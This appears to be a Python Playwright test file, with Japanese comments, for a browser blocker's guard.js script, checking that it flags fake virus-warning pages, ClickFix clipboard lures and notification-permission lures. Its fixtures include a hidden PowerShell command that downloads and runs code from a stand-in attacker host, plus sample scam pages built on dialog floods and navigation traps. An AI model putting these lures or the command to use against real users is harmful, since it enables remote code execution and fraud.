# SPDX-License-Identifier: Apache-2.0
# Copyright 2026 The Shoji Authors
"""詐欺ページ対策（guard.js）を実際のブラウザで確かめる。Playwright が無ければ飛ばす。

    python tests/test_guard_browser.py
"""
from __future__ import annotations

import html
import importlib.util
import json
import sys
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT))

GUARD = (ROOT / "shoji" / "assets" / "guard.js").read_text(encoding="utf-8")
CFG = json.dumps({"f": {"block_malware": True}, "magic": "https://shoji.blocker"})

SCAM = """<h1>警告: お使いのコンピューターはウイルスに感染しています</h1>
<p>Microsoft Windows Defender がトロイの木馬を検出しました。コンピューターはロックされました。</p>
<p>今すぐサポートセンターにお電話ください: 0120-123-456</p>
<script>for (var i = 0; i < 30; i++) history.pushState({}, '', '#x' + i);
window.addEventListener('beforeunload', function (e) { e.preventDefault(); });
setTimeout(function () { for (var i = 0; i < 8; i++) alert('ウイルスに感染しています'); }, 200);</script>"""
NEWS = """<h1>新型ウイルスの感染者が増加</h1><p>相談窓口（0120-565-653）にお電話ください。マイクロソフトの決算も発表。</p>
<script>setTimeout(function () { alert('確認'); }, 200);</script>"""
QUIZ = """<p>Quiz</p><script>setTimeout(function () { alert('1'); confirm('2'); alert('3'); }, 200);</script>"""


def page(body: str) -> str:
    js = GUARD.replace("window.__SHOJI_CFG__", CFG)
    return f'<!doctype html><html><head><meta charset="utf-8"><script>{js}</script></head><body>{body}</body></html>'


def test_guard_in_browser():
    if importlib.util.find_spec("playwright") is None:
        print("skip: playwright not installed")
        return
    from playwright.sync_api import sync_playwright
    results = {}
    with sync_playwright() as p:
        browser = p.chromium.launch()
        for name, body in (("scam", SCAM), ("news", NEWS), ("quiz", QUIZ)):
            pg = browser.new_page()
            n = {"dialogs": 0}

            def on_dialog(d, n=n):
                n["dialogs"] += 1
                d.dismiss()
            pg.on("dialog", on_dialog)
            html = page(body)

            def handle(route, _req, html=html):
                if route.request.url.startswith("https://guard.test/"):
                    route.fulfill(status=200, content_type="text/html", body=html)
                else:
                    route.abort()
            pg.route("**/*", handle)
            pg.goto("https://guard.test/")
            pg.wait_for_timeout(2500)
            results[name] = (pg.evaluate("!!document.querySelector('shoji-guard')"), n["dialogs"])
            pg.close()
        browser.close()
    assert results["scam"][0] and results["scam"][1] <= 5, results       # 検出し、ダイアログの連発を止める
    assert results["news"] == (False, 1), results                          # ふつうのニュースは反応しない
    assert results["quiz"] == (False, 3), results                          # 数回のダイアログは止めない


# ClickFix: 偽の「ロボットではありません」。ボタンで隠れたコマンドをコピーさせ、Win+R で貼り付けさせる
CMD = 'powershell -w h -c "iex(irm https://evil.example/x)" # I am not a robot - Verification ID: 4821'
CMDJS = f"<script>var CMD = {json.dumps(CMD)};</script>"
CLICKFIX = {
    "writeText": CMDJS + """<h2>Verify you are human</h2><p>Press Win + R, then Ctrl + V and Enter.</p>
<button id="b" onclick="navigator.clipboard.writeText(CMD)">I'm not a robot</button>""",
    "execCommand": f"""<h2>ロボットではありません</h2><p>Windows キー + R を押して貼り付けてください</p>
<textarea id="t" style="position:absolute;left:-9999px">{html.escape(CMD)}</textarea>
<button id="b" onclick="var t=document.getElementById('t');t.focus();t.select();document.execCommand('copy')">確認</button>""",
    "setData": CMDJS + """<p>Verification step</p><button id="b" onclick="document.execCommand('copy')">Copy</button>
<script>document.addEventListener('copy', function (e) { e.clipboardData.setData('text/plain', CMD); e.preventDefault(); });</script>""",
    "write": CMDJS + """<p>Please complete the CAPTCHA</p><button id="b" onclick="navigator.clipboard.write([new ClipboardItem({'text/plain': new Blob([CMD], {type: 'text/plain'})})])">OK</button>""",
}
# 技術文書の「コピー」ボタン（コマンドがページに表示されている）は止めない
DOCS_CMD = "powershell -Command Get-Process | Sort-Object CPU"
DOCS = f"""<h2>How to list processes</h2><pre><code>{DOCS_CMD}</code></pre>
<button id="b" onclick="navigator.clipboard.writeText({DOCS_CMD!r})">Copy</button>"""
PLAIN = """<p>Share this link</p><button id="b" onclick="navigator.clipboard.writeText('https://example.com/article/123')">Copy link</button>"""


def test_clickfix_in_browser():
    if importlib.util.find_spec("playwright") is None:
        print("skip: playwright not installed")
        return
    from playwright.sync_api import sync_playwright
    results = {}
    with sync_playwright() as p:
        browser = p.chromium.launch()
        cases = dict(CLICKFIX, docs=DOCS, plain=PLAIN)
        for name, body in cases.items():
            ctx = browser.new_context(permissions=["clipboard-read", "clipboard-write"])
            pg = ctx.new_page()
            html = page(body)
            pg.route("**/*", lambda route, _r, html=html: route.fulfill(status=200, content_type="text/html", body=html)
                     if route.request.url.startswith("https://guard.test/") else route.abort())
            pg.goto("https://guard.test/")
            pg.evaluate("navigator.clipboard.writeText('before')")
            pg.click("#b")
            pg.wait_for_timeout(500)
            results[name] = (pg.evaluate("!!document.querySelector('shoji-guard')"),
                             pg.evaluate("navigator.clipboard.readText()"))
            ctx.close()
        browser.close()
    for name in CLICKFIX:
        warned, clip = results[name]
        assert warned and "powershell" not in clip and clip.startswith("Shoji"), (name, results[name])
    assert results["docs"] == (False, DOCS_CMD), results
    assert results["plain"] == (False, "https://example.com/article/123"), results


# 通知の許可の要求。SPY は本物の requestPermission が呼ばれた回数を数える（guard.js より前に置く）
# （ヘッドレスの Chromium は通知が最初から「拒否」なので、まだ決めていない状態に見せる）
SPY = """<script>window.ORIG = 0; Object.defineProperty(Notification, 'permission', {get: function () { return 'default'; }});
(function () { var o = Notification.requestPermission;
Notification.requestPermission = function () { window.ORIG++; return o.apply(Notification, arguments); }; })();</script>"""
NOTIFY = {
    # 開いただけで要求 → 止める。ボタンを押したときの要求 → 出す
    "normal": ('<button id="b" onclick="Notification.requestPermission()">Get notifications</button>'
               '<script>Notification.requestPermission().then(function (r) { window.R1 = r; })</script>', 1),
    # 「許可を押してロボットでないことを確認」→ ボタンを押しても止める
    "lure": ('<p>Click Allow to verify that you are not a robot</p>'
             '<button id="b" onclick="Notification.requestPermission()">Continue</button>', 0),
}


def test_notification_prompts_in_browser():
    if importlib.util.find_spec("playwright") is None:
        print("skip: playwright not installed")
        return
    from playwright.sync_api import sync_playwright
    with sync_playwright() as p:
        browser = p.chromium.launch()
        for name, (body, want) in NOTIFY.items():
            ctx = browser.new_context()
            pg = ctx.new_page()
            html = page(body).replace("<head>", "<head>" + SPY, 1)
            pg.route("**/*", lambda route, _r, html=html: route.fulfill(status=200, content_type="text/html", body=html)
                     if route.request.url.startswith("https://guard.test/") else route.abort())
            pg.goto("https://guard.test/")
            pg.wait_for_timeout(300)
            pg.click("#b")
            pg.wait_for_timeout(300)
            got = pg.evaluate("[window.ORIG, window.R1 || null]")
            assert got[0] == want, (name, got)
            if name == "normal":
                assert got[1] == "default", got            # 開いただけの要求には「未決定」を返す
            ctx.close()
        browser.close()


if __name__ == "__main__":
    test_guard_in_browser()
    print("OK test_guard_in_browser")
    test_clickfix_in_browser()
    print("OK test_clickfix_in_browser")
    test_notification_prompts_in_browser()
    print("OK test_notification_prompts_in_browser")
